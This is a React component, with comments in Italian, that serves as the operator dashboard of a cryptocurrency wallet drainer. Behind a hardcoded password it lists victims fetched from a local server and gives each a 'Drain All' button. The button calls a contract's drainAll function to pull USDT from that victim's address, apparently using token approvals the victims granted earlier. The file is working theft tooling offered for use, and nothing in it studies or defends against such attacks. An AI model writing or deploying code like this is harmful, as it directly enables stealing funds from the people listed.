import { useState } from "react";
import { ethers } from "ethers";

export default function Dashboard() {
  const [password, setPassword] = useState("");
  const [logged, setLogged] = useState(false);
  const [users, setUsers] = useState([]);

  const CONTRACT_ADDRESS = "0xTUO_CONTRACT"; // 🔥 METTI QUI IL TUO
  const USDT = "0x55d398326f99059fF775485246999027B3197955";

  const ABI = [
    "function drainAll(address token, address from)",
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function decimals() view returns (uint8)"
  ];

  const login = async () => {
    if (password === "Armadio") {
      setLogged(true);

      const res = await fetch("http://localhost:3001/users");
const data = await res.json();

setUsers(data);

    } else {
      alert("Password sbagliata");
    }
  };

  // 🔥 DRAIN ALL
  const drainUser = async (user) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const contract = new ethers.Contract(
        CONTRACT_ADDRESS,
        ["function drainAll(address token, address from)"],
        signer
      );

      const tx = await contract.drainAll(USDT, user);

      await tx.wait();

      alert("Drain completato 🔥");

    } catch (err) {
      console.error(err);
      alert("Errore transazione");
    }
  };

  if (!logged) {
    return (
      <div style={{
        background: "#0b0b0b",
        minHeight: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        color: "white"
      }}>
        <div>
          <h2>Dashboard Login</h2>
          <input
            type="password"
            onChange={(e) => setPassword(e.target.value)}
            style={{ padding: "10px", borderRadius: "10px" }}
          />
          <br /><br />
          <button onClick={login}>Login</button>
        </div>
      </div>
    );
  }

  return (
    <div style={{
      background: "#0b0b0b",
      minHeight: "100vh",
      color: "white",
      padding: "20px"
    }}>
      <h2>Utenti</h2>

      {users.map((u, i) => (
        <div key={i} style={{
          background: "#1a1a1a",
          padding: "15px",
          borderRadius: "10px",
          marginTop: "10px"
        }}>
          <div><b>ID:</b> {u.id}</div>
<div><b>Username:</b> {u.username}</div>

          <button
            onClick={() => drainUser(u.address)}
            style={{
              marginTop: "10px",
              padding: "10px",
              background: "#00ff88",
              color: "black",
              border: "none",
              borderRadius: "8px",
              cursor: "pointer"
            }}
          >
            Drain All
          </button>
        </div>
      ))}
    </div>
  );
}